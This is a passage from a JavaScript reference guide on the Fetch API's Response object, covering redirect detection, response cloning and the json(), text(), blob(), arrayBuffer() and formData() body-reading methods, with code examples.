    console.log('HTTP redirect to:', response.url);
  } else if (response.status === 200 && 
             response.headers.get('content-type')?.includes('text/html')) {
    const html = await response.text();
    // Check for meta refresh or JavaScript redirects
    if (html.includes('<meta http-equiv="refresh"')) {
      console.log('Meta refresh detected (not HTTP redirect)');
      // response.redirected would be false
    }
  }
}
```

### Browser Support

The `redirected` property is widely supported across modern browsers. [Unverified] All browsers that support the Fetch API include support for the `redirected` property.

### Performance Implications

[Inference] Each redirect adds network latency:

```javascript
async function measureRedirectImpact(url) {
  const start = performance.now();
  const response = await fetch(url);
  const duration = performance.now() - start;
  
  if (response.redirected) {
    console.log(`Request with redirect took: ${duration}ms`);
    // Each redirect typically adds 100-500ms depending on server location
  }
}
```

### Debugging Redirects

Combine with other Response properties for comprehensive debugging:

```javascript
async function debugFetch(url) {
  try {
    const response = await fetch(url);
    
    console.log('Debug Info:', {
      originalUrl: url,
      finalUrl: response.url,
      redirected: response.redirected,
      status: response.status,
      statusText: response.statusText,
      type: response.type,
      headers: Object.fromEntries(response.headers.entries())
    });
    
    return response;
  } catch (error) {
    console.error('Fetch failed:', error);
    throw error;
  }
}
```

### Common Pitfalls

#### Assuming Single Redirect

```javascript
// ❌ Incorrect assumption
if (response.redirected) {
  console.log('One redirect occurred');
  // Could have been multiple redirects in chain
}

// ✓ Correct interpretation
if (response.redirected) {
  console.log('At least one redirect occurred');
  console.log('Final destination:', response.url);
}
```

#### Checking Status Instead of redirected

```javascript
// ❌ Won't work - status is from final response
if (response.status === 301 || response.status === 302) {
  console.log('Redirected'); // Never true with redirect: 'follow'
}

// ✓ Correct way
if (response.redirected) {
  console.log('Redirected to:', response.url);
}
```

#### Ignoring Manual Mode Behavior

```javascript
// With redirect: 'manual', redirected is always false
const response = await fetch(url, { redirect: 'manual' });
console.log(response.redirected); // Always false
console.log(response.type); // 'opaqueredirect' if redirect occurred
```

### Comparison with XMLHttpRequest

Unlike XMLHttpRequest, which doesn't expose redirect information easily, Fetch provides this property explicitly:

```javascript
// Fetch API - straightforward
const response = await fetch(url);
if (response.redirected) {
  console.log('Redirected to:', response.url);
}

// XMLHttpRequest - [Inference] requires monitoring responseURL changes
const xhr = new XMLHttpRequest();
xhr.open('GET', url);
xhr.onload = function() {
  if (xhr.responseURL !== url) {
    console.log('Likely redirected to:', xhr.responseURL);
  }
};
xhr.send();
```

---

## Response Cloning

### Why Response Bodies Can Only Be Read Once

Response objects in the Fetch API contain a `ReadableStream` for the body, which can only be consumed once. After calling methods like `.json()`, `.text()`, `.blob()`, or `.arrayBuffer()`, the stream is locked and drained. Attempting to read it again throws a `TypeError: body stream already read`.

```javascript
const response = await fetch('/api/data');
const data1 = await response.json(); // Works
const data2 = await response.json(); // TypeError: body stream already read
```

The `bodyUsed` property indicates whether the body has been consumed:

```javascript
console.log(response.bodyUsed); // true after reading
```

### The `clone()` Method

`Response.clone()` creates an independent copy of the Response object with its own body stream. Both the original and cloned responses can be read separately.

```javascript
const response = await fetch('/api/data');
const clone = response.clone();

const data1 = await response.json();
const data2 = await clone.json(); // Works independently
```

### Technical Behavior

**Stream Duplication**: `clone()` creates a new `ReadableStream` that tees from the original, allowing parallel consumption without interference.

**Property Copying**: Headers, status, statusText, URL, and other metadata are copied to the clone. Both responses share the same values but are independent objects.

**Immutability Preservation**: Responses are immutable. Cloning maintains this—modifying headers on one doesn't affect the other.

### Common Use Cases

**Caching Responses**:

```javascript
async function fetchWithCache(url) {
  const response = await fetch(url);
  const clone = response.clone();
  
  // Store in cache
  caches.open('my-cache').then(cache => {
    cache.put(url, clone);
  });
  
  // Return original for immediate use
  return response.json();
}
```

**Multiple Consumers**:

```javascript
const response = await fetch('/api/data');

// Send to different processors
processJSON(response.clone());
logResponse(response.clone());
storeBackup(response.clone());
```

**Conditional Processing**:

```javascript
const response = await fetch('/api/data');
const clone = response.clone();

if (response.ok) {
  return response.json();
} else {
  const errorText = await clone.text();
  console.error('Error response:', errorText);
}
```

### Timing Constraints

Cloning must occur **before** reading the body:

```javascript
const response = await fetch('/api/data');
await response.json(); // Body consumed

const clone = response.clone(); // TypeError: body stream is locked
```

### Performance Considerations

**Memory Overhead**: Each clone maintains its own buffer. Cloning large responses (images, videos, large JSON) duplicates memory usage.

**Stream Teeing Cost**: The underlying implementation uses stream teeing, which has computational overhead. Multiple clones of the same response multiply this cost.

**Best Practice**: Only clone when necessary. If you need the same data in multiple places, read once and pass the parsed result.

```javascript
// Less efficient
const r1 = response.clone();
const r2 = response.clone();
const data1 = await r1.json();
const data2 = await r2.json();

// More efficient
const data = await response.json();
processData(data);
storeData(data);
```

### Cloning with Service Workers

Service workers commonly clone responses to both serve and cache:

```javascript
self.addEventListener('fetch', event => {
  event.respondWith(
    fetch(event.request).then(response => {
      const clone = response.clone();
      
      caches.open('v1').then(cache => {
        cache.put(event.request, clone);
      });
      
      return response;
    })
  );
});
```

### Error Handling

**Network Errors**: If the original fetch fails, cloning the response doesn't change the error state.

**Body Errors**: If reading the body fails (corrupted data, network interruption), both original and clone will fail when attempting to read.

```javascript
try {
  const response = await fetch('/api/data');
  const clone = response.clone();
  
  const data = await response.json();
} catch (error) {
  // Clone still available if error occurred during json() parsing
  const text = await clone.text();
  console.error('Raw response:', text);
}
```

### Limitations

**Already-Read Bodies**: Cannot clone after the body has been consumed.

**Locked Streams**: Cannot clone if the body stream is locked by another reader.

**Opaque Responses**: Can clone opaque responses (no-cors mode), but cannot read their bodies regardless.

```javascript
const response = await fetch('https://external-api.com', { mode: 'no-cors' });
const clone = response.clone(); // Works
await clone.text(); // Returns empty string for opaque responses
```

### Multiple Cloning

You can clone a response multiple times, each creating an independent copy:

```javascript
const response = await fetch('/api/data');
const clone1 = response.clone();
const clone2 = response.clone();
const clone3 = clone1.clone(); // Can clone a clone

// All can be read independently
const data1 = await response.json();
const data2 = await clone1.json();
const data3 = await clone2.json();
const data4 = await clone3.json();
```

### Integration with Response Constructor

Cloned responses behave identically to original responses when passed to `new Response()`:

```javascript
const original = await fetch('/api/data');
const clone = original.clone();

const manualResponse = new Response(clone.body, {
  status: clone.status,
  headers: clone.headers
});
```

---

# Response Body Methods

## response.json()

### What It Does

`response.json()` is a method that reads the response stream from a fetch request and parses it as JSON. It returns a Promise that resolves to a JavaScript object representing the parsed JSON data.

### Return Value

Returns a `Promise` that resolves to the result of parsing the response body text as JSON. This can be any valid JSON type: object, array, string, number, boolean, or null.

### Basic Usage

```javascript
fetch('https://api.example.com/data')
  .then(response => response.json())
  .then(data => {
    console.log(data); // JavaScript object/array
  });
```

With async/await:

```javascript
const response = await fetch('https://api.example.com/data');
const data = await response.json();
console.log(data);
```

### Body Stream Consumption

`response.json()` consumes the response body stream completely. After calling it:

- The body stream is **locked** and cannot be read again
- You cannot call `response.text()`, `response.blob()`, or any other body method
- You cannot call `response.json()` again on the same response

```javascript
const response = await fetch('https://api.example.com/data');
const data1 = await response.json();
const data2 = await response.json(); // TypeError: body stream already read
```

### Error Handling

The method can reject for multiple reasons:

**JSON Parsing Errors:**

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  const data = await response.json(); // Throws if response isn't valid JSON
} catch (error) {
  console.error('JSON parsing failed:', error);
}
```

**Network Errors:**

```javascript
try {
  const response = await fetch('https://api.example.com/data');
  const data = await response.json();
} catch (error) {
  console.error('Fetch or parsing failed:', error);
}
```

### HTTP Status Checking

`response.json()` will attempt to parse JSON **regardless of HTTP status code**. It doesn't automatically throw on 4xx or 5xx responses:

```javascript
const response = await fetch('https://api.example.com/data');

if (!response.ok) {
  // Handle HTTP errors before parsing
  throw new Error(`HTTP error! status: ${response.status}`);
}

const data = await response.json();
```

Common pattern:

```javascript
const response = await fetch('https://api.example.com/data');

if (!response.ok) {
  const errorData = await response.json(); // Error responses often contain JSON
  throw new Error(errorData.message || 'Request failed');
}

const data = await response.json();
```

### Content-Type Considerations

`response.json()` doesn't validate the `Content-Type` header. It will attempt to parse any response body as JSON:

```javascript
// Works even if server sends text/html or other Content-Type
const response = await fetch('https://api.example.com/data');
const data = await response.json(); // Attempts parsing regardless
```

[Inference] Best practice is to check `Content-Type` before parsing if you need strict validation:

```javascript
const response = await fetch('https://api.example.com/data');
const contentType = response.headers.get('content-type');

if (!contentType || !contentType.includes('application/json')) {
  throw new TypeError("Response wasn't JSON");
}

const data = await response.json();
```

### Empty Responses

Calling `response.json()` on an empty response body throws a `SyntaxError`:

```javascript
// Response with empty body
const response = await fetch('https://api.example.com/delete/123'); // 204 No Content
const data = await response.json(); // SyntaxError: Unexpected end of JSON input
```

Handle empty responses:

```javascript
const response = await fetch('https://api.example.com/data');

if (response.status === 204 || response.headers.get('content-length') === '0') {
  return null; // Or handle accordingly
}

const data = await response.json();
```

### Cloning Responses

To read the body multiple times, clone the response first:

```javascript
const response = await fetch('https://api.example.com/data');
const clone = response.clone();

const data1 = await response.json();
const data2 = await clone.json(); // Works because we cloned
```

### Performance Considerations

`response.json()` must:

1. Read the entire response body into memory
2. Parse the complete text as JSON

For large JSON responses, this can be memory-intensive. The parsing is synchronous once the data is received.

### Relationship to Other Body Methods

The Response interface provides several body reading methods, but only one can be called per response:

- `response.json()` - Parse as JSON
- `response.text()` - Get as string
- `response.blob()` - Get as Blob
- `response.arrayBuffer()` - Get as ArrayBuffer
- `response.formData()` - Parse as FormData

### TypeScript Typing

In TypeScript, you can type the resolved value:

```typescript
interface User {
  id: number;
  name: string;
  email: string;
}

const response = await fetch('https://api.example.com/user/1');
const user: User = await response.json();
```

[Inference] The generic typing doesn't provide runtime validation - `response.json()` always returns `Promise<any>` at runtime.

### Common Patterns

**Complete error handling:**

```javascript
async function fetchJSON(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
    }
    
    const data = await response.json();
    return data;
    
  } catch (error) {
    if (error instanceof SyntaxError) {
      console.error('Invalid JSON:', error);
    } else {
      console.error('Fetch error:', error);
    }
    throw error;
  }
}
```

**Checking for JSON before parsing:**

```javascript
async function safeJSONParse(response) {
  const text = await response.text();
  
  if (!text) {
    return null;
  }
  
  try {
    return JSON.parse(text);
  } catch (error) {
    console.error('JSON parse error:', error);
    throw error;
  }
}
```

### Browser Compatibility

`response.json()` is part of the Fetch API standard and is supported in all modern browsers. It's also available in Node.js 18+ and Deno.

---

## response.text()

### Method Signature

```javascript
response.text(): Promise<string>
```

Returns a promise that resolves with the response body as a UTF-8 decoded string. This method reads the entire response stream to completion.

### Basic Usage

```javascript
fetch('https://api.example.com/data')
  .then(response => response.text())
  .then(text => {
    console.log(text);
  })
  .catch(error => {
    console.error('Error:', error);
  });
```

With async/await:

```javascript
async function fetchData() {
  try {
    const response = await fetch('https://api.example.com/data');
    const text = await response.text();
    console.log(text);
  } catch (error) {
    console.error('Error:', error);
  }
}
```

### Body Stream Consumption

Once `response.text()` is called, the body stream is locked and consumed. You cannot call any other body reading method afterward on the same response.

```javascript
const response = await fetch('https://api.example.com/data');
const text = await response.text();

// This will throw an error - body already consumed
const json = await response.json(); // TypeError: Failed to execute 'json'
```

### Checking Body Consumption Status

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false

const text = await response.text();

console.log(response.bodyUsed); // true
```

### Common Use Cases

#### HTML Content

```javascript
async function loadHTML() {
  const response = await fetch('/page.html');
  const html = await response.text();
  document.getElementById('content').innerHTML = html;
}
```

#### Plain Text Files

```javascript
async function loadTextFile() {
  const response = await fetch('/data.txt');
  const text = await response.text();
  return text.split('\n');
}
```

#### CSV Data

```javascript
async function loadCSV() {
  const response = await fetch('/data.csv');
  const csvText = await response.text();
  
  const rows = csvText.split('\n');
  const data = rows.map(row => row.split(','));
  
  return data;
}
```

#### XML/SVG Content

```javascript
async function loadSVG() {
  const response = await fetch('/icon.svg');
  const svgText = await response.text();
  
  const parser = new DOMParser();
  const svgDoc = parser.parseFromString(svgText, 'image/svg+xml');
  
  return svgDoc;
}
```

### Error Handling Patterns

#### Response Status Validation

```javascript
async function fetchWithValidation(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    const errorText = await response.text();
    throw new Error(`HTTP ${response.status}: ${errorText}`);
  }
  
  return await response.text();
}
```

#### Network Error Handling

```javascript
async function safeFetch(url) {
  try {
    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`HTTP error: ${response.status}`);
    }
    
    const text = await response.text();
    return { success: true, data: text };
    
  } catch (error) {
    if (error instanceof TypeError) {
      return { success: false, error: 'Network error or CORS issue' };
    }
    return { success: false, error: error.message };
  }
}
```

### Converting Text to Other Formats

#### Manual JSON Parsing

```javascript
const response = await fetch('https://api.example.com/data');
const text = await response.text();

try {
  const data = JSON.parse(text);
  console.log(data);
} catch (error) {
  console.error('Invalid JSON:', text);
}
```

#### Base64 Encoding

```javascript
async function textToBase64(url) {
  const response = await fetch(url);
  const text = await response.text();
  return btoa(text);
}
```

### Character Encoding

The `text()` method always decodes the body as UTF-8. If you need different encoding, use `arrayBuffer()` or `blob()` with TextDecoder.

```javascript
async function fetchWithEncoding(url, encoding = 'utf-8') {
  const response = await fetch(url);
  const buffer = await response.arrayBuffer();
  
  const decoder = new TextDecoder(encoding);
  return decoder.decode(buffer);
}

// Usage
const latin1Text = await fetchWithEncoding('/data.txt', 'iso-8859-1');
```

### Response Cloning for Multiple Reads

To read the response body multiple times or with different methods, clone the response first.

```javascript
const response = await fetch('https://api.example.com/data');

// Clone before consuming
const clonedResponse = response.clone();

// Now you can use both
const text = await response.text();
const json = await clonedResponse.json();

console.log('Text:', text);
console.log('JSON:', json);
```

### Streaming Large Text Responses

For very large responses, consider streaming instead of loading everything into memory at once.

```javascript
async function streamText(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let result = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    const chunk = decoder.decode(value, { stream: true });
    result += chunk;
    
    // Process chunk immediately if needed
    console.log('Received chunk:', chunk.length, 'bytes');
  }
  
  return result;
}
```

### Performance Considerations

**Memory Usage:** The entire response is loaded into memory as a string. For large files, this can be significant.

```javascript
// This loads entire file into memory
const response = await fetch('/large-file.txt');
const text = await response.text(); // Could be hundreds of MB

// Better approach for large files
const response = await fetch('/large-file.txt');
const reader = response.body.getReader();
// Process in chunks
```

**Decoding Cost:** UTF-8 decoding happens synchronously and can block the main thread for very large responses.

### Comparison with Other Body Methods

| Method | Return Type | Use Case |
|--------|-------------|----------|
| `text()` | Promise\<string\> | Plain text, HTML, CSV, XML |
| `json()` | Promise\<any\> | JSON data (automatic parsing) |
| `blob()` | Promise\<Blob\> | Binary data, files, images |
| `arrayBuffer()` | Promise\<ArrayBuffer\> | Raw binary, custom encoding |
| `formData()` | Promise\<FormData\> | Multipart form data |

### Common Pitfalls

#### Reading Body Twice

```javascript
// ❌ Wrong - body can only be read once
const response = await fetch(url);
const text1 = await response.text();
const text2 = await response.text(); // Error!

// ✅ Correct - store the result
const response = await fetch(url);
const text = await response.text();
const copy = text; // Use the stored string
```

#### Not Handling Empty Responses

```javascript
// ❌ Assumes response always has content
const response = await fetch(url);
const text = await response.text();
const firstLine = text.split('\n')[0]; // Could fail if empty

// ✅ Handle empty responses
const response = await fetch(url);
const text = await response.text();
if (text.trim()) {
  const firstLine = text.split('\n')[0];
}
```

#### Ignoring Content Type

```javascript
// ❌ Using text() for everything
const response = await fetch(url);
const text = await response.text();
const data = JSON.parse(text); // Inefficient

// ✅ Use appropriate method
const response = await fetch(url);
const contentType = response.headers.get('content-type');

if (contentType?.includes('application/json')) {
  const data = await response.json();
} else {
  const text = await response.text();
}
```

### Browser Compatibility

The `text()` method is part of the Fetch API standard and is supported in all modern browsers. For older browser support, consider using a polyfill.

Supported in Chrome 42+, Firefox 39+, Safari 10.1+, Edge 14+, and all modern mobile browsers.

### Testing Strategies

```javascript
// Mock fetch for testing
global.fetch = jest.fn(() =>
  Promise.resolve({
    ok: true,
    text: () => Promise.resolve('mocked text response')
  })
);

test('fetches text data', async () => {
  const result = await fetchData();
  expect(result).toBe('mocked text response');
  expect(fetch).toHaveBeenCalledWith(expectedUrl);
});
```

### Best Practices Summary

1. Always validate response status before reading body
2. Store the text result if you need to use it multiple times
3. Use appropriate body method based on content type
4. Consider streaming for very large responses
5. Handle errors and empty responses gracefully
6. Clone response if you need multiple body readings

---

## response.blob()

The `response.blob()` method returns a promise that resolves with a `Blob` object representing the response body. This method is specifically designed for handling binary data returned from fetch requests.

### Method Signature

```javascript
response.blob()
```

**Returns:** A `Promise` that resolves to a `Blob` object.

### When to Use response.blob()

Use `response.blob()` when you need to work with binary data such as:

- Images (JPEG, PNG, GIF, WebP, SVG)
- PDFs and other documents
- Audio files (MP3, WAV, OGG)
- Video files (MP4, WebM)
- Archive files (ZIP, RAR)
- Any other binary file format

### Basic Usage Pattern

```javascript
fetch('https://example.com/image.jpg')
  .then(response => response.blob())
  .then(blob => {
    // Work with the blob
    console.log(blob.size); // File size in bytes
    console.log(blob.type); // MIME type
  })
  .catch(error => console.error('Error:', error));
```

### Blob Object Properties

Once you have the Blob object, you can access:

- **`blob.size`**: The size of the blob in bytes
- **`blob.type`**: The MIME type of the blob (e.g., "image/jpeg", "application/pdf")

### Common Use Cases

#### Displaying Images

```javascript
async function loadAndDisplayImage(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  // Create object URL
  const objectURL = URL.createObjectURL(blob);
  
  // Use in img element
  const img = document.createElement('img');
  img.src = objectURL;
  document.body.appendChild(img);
  
  // Clean up when done
  img.onload = () => URL.revokeObjectURL(objectURL);
}
```

#### Downloading Files

```javascript
async function downloadFile(url, filename) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  // Create download link
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
  
  // Clean up
  URL.revokeObjectURL(link.href);
}
```

#### Uploading to Server

```javascript
async function uploadImage(imageUrl) {
  // Fetch the image as blob
  const response = await fetch(imageUrl);
  const blob = await response.blob();
  
  // Upload to server
  const formData = new FormData();
  formData.append('file', blob, 'image.jpg');
  
  await fetch('/upload', {
    method: 'POST',
    body: formData
  });
}
```

#### Converting to Base64

```javascript
async function blobToBase64(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => resolve(reader.result);
    reader.onerror = reject;
    reader.readAsDataURL(blob);
  });
}

// Usage
const base64 = await blobToBase64('https://example.com/image.jpg');
console.log(base64); // "data:image/jpeg;base64,/9j/4AAQ..."
```

#### Reading Blob Content as Text

```javascript
async function blobToText(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  return await blob.text();
}
```

#### Creating Blob URLs for Media Players

```javascript
async function loadVideo(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  const video = document.querySelector('video');
  video.src = URL.createObjectURL(blob);
  video.play();
}
```

### Memory Management and Object URLs

When using `URL.createObjectURL()`, always revoke the URL when finished to prevent memory leaks:

```javascript
const objectURL = URL.createObjectURL(blob);

// Use the URL...

// Clean up when done
URL.revokeObjectURL(objectURL);
```

**Best practices:**

- Revoke URLs after the resource has loaded
- Revoke URLs when the component/element is destroyed
- Use the `onload` event for images to ensure the resource is ready before revoking

### Error Handling

Always check the response status before calling `blob()`:

```javascript
async function fetchBlob(url) {
  const response = await fetch(url);
  
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  
  const contentType = response.headers.get('content-type');
  if (!contentType || !contentType.includes('image')) {
    throw new Error('Response is not an image');
  }
  
  return await response.blob();
}
```

### Body Consumed State

Important: Once you call `response.blob()`, the response body is consumed and cannot be read again:

```javascript
const response = await fetch(url);
const blob1 = await response.blob(); // Works

// This will throw an error
const blob2 = await response.blob(); // Error: body already read
```

To use the response multiple times, clone it first:

```javascript
const response = await fetch(url);
const clonedResponse = response.clone();

const blob1 = await response.blob();
const blob2 = await clonedResponse.blob();
```

### Blob Slicing

You can extract portions of a blob using the `slice()` method:

```javascript
const response = await fetch('large-file.bin');
const blob = await response.blob();

// Extract first 1MB
const chunk = blob.slice(0, 1024 * 1024);
console.log(chunk.size); // 1048576 bytes
```

### Converting Between Response Methods

While `response.blob()` is for binary data, you can convert between formats:

```javascript
// Blob to ArrayBuffer
const response = await fetch(url);
const blob = await response.blob();
const arrayBuffer = await blob.arrayBuffer();

// Blob to text (for text files fetched as blob)
const text = await blob.text();

// Blob to JSON (if the blob contains JSON)
const json = JSON.parse(await blob.text());
```

### Browser Compatibility

The `response.blob()` method is widely supported in all modern browsers. However, for older browsers, consider checking:

```javascript
if ('blob' in Response.prototype) {
  // blob() is supported
} else {
  // Fallback required
}
```

### Performance Considerations

- **Streaming**: For very large files, consider using streams instead of loading the entire blob into memory
- **Memory usage**: Blobs are stored in memory, so be mindful of loading multiple large files
- **Caching**: Use appropriate cache headers to avoid re-downloading the same resources

### Working with Streams (Advanced)

For large files, you might want to process the response as a stream instead:

```javascript
async function downloadLargeFile(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  const chunks = [];
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    chunks.push(value);
  }
  
  // Combine chunks into blob
  const blob = new Blob(chunks);
  return blob;
}
```

### MIME Type Handling

The blob's MIME type is determined by the `Content-Type` header:

```javascript
const response = await fetch(url);
const blob = await response.blob();

console.log(blob.type); // e.g., "image/jpeg"

// Override MIME type if needed
const newBlob = blob.slice(0, blob.size, 'image/png');
console.log(newBlob.type); // "image/png"
```

### Creating New Blobs from Response Data

```javascript
async function modifyImage(url) {
  const response = await fetch(url);
  const blob = await response.blob();
  
  // Create a new blob with modified type
  const modifiedBlob = new Blob([blob], { 
    type: 'image/png' 
  });
  
  return modifiedBlob;
}
```

### Practical Example: Image Gallery with Lazy Loading

```javascript
class ImageGallery {
  constructor() {
    this.cache = new Map();
  }
  
  async loadImage(url) {
    // Check cache first
    if (this.cache.has(url)) {
      return this.cache.get(url);
    }
    
    // Fetch and cache
    const response = await fetch(url);
    if (!response.ok) {
      throw new Error(`Failed to load: ${url}`);
    }
    
    const blob = await response.blob();
    const objectURL = URL.createObjectURL(blob);
    
    this.cache.set(url, objectURL);
    return objectURL;
  }
  
  clearCache() {
    // Revoke all object URLs
    for (const url of this.cache.values()) {
      URL.revokeObjectURL(url);
    }
    this.cache.clear();
  }
}

// Usage
const gallery = new ImageGallery();
const imageUrl = await gallery.loadImage('photo.jpg');
document.querySelector('img').src = imageUrl;
```

### Security Considerations

- **CORS**: Ensure proper CORS headers are set for cross-origin blob requests
- **Content validation**: Always validate the content type before using blobs
- **Size limits**: Implement size checks to prevent memory exhaustion
- **Sanitization**: Be cautious with user-uploaded content that's fetched as blobs

```javascript
async function safeBlobFetch(url, maxSize = 10 * 1024 * 1024) {
  const response = await fetch(url);
  
  // Check content length
  const contentLength = response.headers.get('content-length');
  if (contentLength && parseInt(contentLength) > maxSize) {
    throw new Error('File too large');
  }
  
  // Validate content type
  const contentType = response.headers.get('content-type');
  const allowedTypes = ['image/jpeg', 'image/png', 'image/gif'];
  if (!allowedTypes.includes(contentType)) {
    throw new Error('Invalid content type');
  }
  
  return await response.blob();
}
```

---

## response.arrayBuffer()

The `arrayBuffer()` method reads the response stream to completion and returns a promise that resolves with an `ArrayBuffer` containing the raw binary data of the response body.

### Method Signature

```javascript
arrayBuffer(): Promise<ArrayBuffer>
```

### Return Value

A Promise that resolves to an `ArrayBuffer` containing the complete response body as raw binary data. The ArrayBuffer represents a fixed-length raw binary data buffer.

### Key Characteristics

#### Single-Use Consumption

The response body can only be read once. After calling `arrayBuffer()`, the body is consumed and subsequent calls to any body reading methods (`json()`, `text()`, `blob()`, `arrayBuffer()`, `formData()`) will reject with a TypeError.

```javascript
const response = await fetch('https://example.com/data.bin');
const buffer1 = await response.arrayBuffer(); // Works
const buffer2 = await response.arrayBuffer(); // TypeError: body already consumed
```

#### Stream Exhaustion

The method reads the entire response stream before resolving. For large files, this means the entire content is loaded into memory before the promise resolves.

#### Body Properties

After consumption:

- `response.bodyUsed` becomes `true`
- `response.body` (ReadableStream) is locked and cannot be read again

### Working with ArrayBuffer

#### Creating Typed Arrays

ArrayBuffer itself doesn't provide direct access to bytes. Use typed array views to manipulate the data:

```javascript
const response = await fetch('https://example.com/binary-data');
const buffer = await response.arrayBuffer();

// View as 8-bit unsigned integers
const uint8View = new Uint8Array(buffer);

// View as 16-bit unsigned integers
const uint16View = new Uint16Array(buffer);

// View as 32-bit floating point numbers
const float32View = new Float32Array(buffer);
```

#### DataView for Mixed Data Types

When binary data contains multiple data types, use DataView for flexible reading:

```javascript
const response = await fetch('https://example.com/mixed-binary');
const buffer = await response.arrayBuffer();
const view = new DataView(buffer);

// Read different types at specific offsets
const int32 = view.getInt32(0, true); // offset 0, little-endian
const float64 = view.getFloat64(4, true); // offset 4
const uint8 = view.getUint8(12); // offset 12
```

### Common Use Cases

#### Image Processing

```javascript
const response = await fetch('https://example.com/image.png');
const buffer = await response.arrayBuffer();
const blob = new Blob([buffer], { type: 'image/png' });
const imageUrl = URL.createObjectURL(blob);
```

#### Binary File Downloads

```javascript
async function downloadBinaryFile(url, filename) {
  const response = await fetch(url);
  const buffer = await response.arrayBuffer();
  const blob = new Blob([buffer]);
  const link = document.createElement('a');
  link.href = URL.createObjectURL(blob);
  link.download = filename;
  link.click();
}
```

#### WebAssembly Module Loading

```javascript
const response = await fetch('module.wasm');
const buffer = await response.arrayBuffer();
const module = await WebAssembly.compile(buffer);
const instance = await WebAssembly.instantiate(module);
```

#### Audio Processing with Web Audio API

```javascript
const response = await fetch('audio.mp3');
const buffer = await response.arrayBuffer();
const audioContext = new AudioContext();
const audioBuffer = await audioContext.decodeAudioData(buffer);
```

#### Cryptographic Operations

```javascript
const response = await fetch('data.bin');
const buffer = await response.arrayBuffer();
const hashBuffer = await crypto.subtle.digest('SHA-256', buffer);
const hashArray = Array.from(new Uint8Array(hashBuffer));
const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
```

### Binary Data Manipulation

#### Checking File Signatures (Magic Numbers)

```javascript
const response = await fetch('file.bin');
const buffer = await response.arrayBuffer();
const bytes = new Uint8Array(buffer);

// Check PNG signature
if (bytes[0] === 0x89 && bytes[1] === 0x50 && 
    bytes[2] === 0x4E && bytes[3] === 0x47) {
  console.log('This is a PNG file');
}
```

#### Byte Slicing

```javascript
const response = await fetch('large-file.bin');
const buffer = await response.arrayBuffer();

// Extract a portion of the buffer
const slice = buffer.slice(100, 200); // bytes 100-199
const sliceView = new Uint8Array(slice);
```

#### Concatenating Buffers

```javascript
function concatenateArrayBuffers(buffer1, buffer2) {
  const tmp = new Uint8Array(buffer1.byteLength + buffer2.byteLength);
  tmp.set(new Uint8Array(buffer1), 0);
  tmp.set(new Uint8Array(buffer2), buffer1.byteLength);
  return tmp.buffer;
}
```

### Memory Considerations

#### Size Limits

ArrayBuffers are constrained by available memory. [Inference: Based on JavaScript engine implementations] Very large responses may cause memory issues or errors. Consider streaming approaches for large files.

#### Memory Management

```javascript
// For large buffers, nullify references when done
let buffer = await response.arrayBuffer();
// ... use buffer ...
buffer = null; // Allow garbage collection
```

### Error Handling

#### Network Errors

```javascript
try {
  const response = await fetch('https://example.com/data.bin');
  if (!response.ok) {
    throw new Error(`HTTP error! status: ${response.status}`);
  }
  const buffer = await response.arrayBuffer();
} catch (error) {
  console.error('Failed to fetch or parse:', error);
}
```

#### Body Already Consumed

```javascript
const response = await fetch('https://example.com/data.bin');

if (response.bodyUsed) {
  console.error('Body already consumed');
} else {
  const buffer = await response.arrayBuffer();
}
```

### Performance Considerations

#### Memory vs Streaming

For large files, `arrayBuffer()` loads everything into memory at once. Consider alternatives:

```javascript
// Instead of arrayBuffer() for large files
const response = await fetch('large-file.bin');
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  // Process chunk (Uint8Array)
  processChunk(value);
}
```

#### Comparison with Other Body Methods

- `arrayBuffer()`: Raw binary, requires typed array views
- `blob()`: Binary with MIME type, good for files
- `text()`: Decodes to UTF-8 string
- `json()`: Parses as JSON
- `formData()`: Parses as multipart/form-data

Choose `arrayBuffer()` when you need direct byte-level access or will convert to specific typed arrays.

### Browser Compatibility

The `arrayBuffer()` method is widely supported in modern browsers as part of the Fetch API specification. [Unverified: Specific version support] For legacy browser support details, check MDN or caniuse.com.

### Related Specifications

The method is defined in the Fetch Standard under the Body mixin interface, which is implemented by both Request and Response objects.·

---

## response.formData()

The `formData()` method of the Response interface reads the response body to completion and parses it as `FormData`. This method is essential for handling multipart/form-data responses from servers.

### Method Signature

```javascript
const formData = await response.formData();
```

Returns a Promise that resolves to a `FormData` object containing the parsed form data.

### Use Cases

#### Receiving File Uploads from Server

When a server sends back form data including files:

```javascript
const response = await fetch('/api/get-form-data');
const formData = await response.formData();

// Access form fields
const username = formData.get('username');
const file = formData.get('avatar'); // File object

// Iterate through all entries
for (const [key, value] of formData.entries()) {
  if (value instanceof File) {
    console.log(`${key}: ${value.name}, ${value.size} bytes`);
  } else {
    console.log(`${key}: ${value}`);
  }
}
```

#### Processing Multipart Responses

Handling responses with mixed text and binary data:

```javascript
const response = await fetch('/api/export-data');
const formData = await response.formData();

const metadata = formData.get('metadata'); // JSON string
const csvFile = formData.get('csv_export'); // File
const pdfReport = formData.get('report'); // File

const parsedMetadata = JSON.parse(metadata);
```

#### Server-Side Form Forwarding

Receiving form data that was submitted elsewhere:

```javascript
const response = await fetch('/api/forwarded-submission');
const formData = await response.formData();

// Re-submit to another endpoint
await fetch('/api/final-destination', {
  method: 'POST',
  body: formData // Forward as-is
});
```

### Content-Type Requirements

The method works with specific content types:

#### Primary: multipart/form-data

```javascript
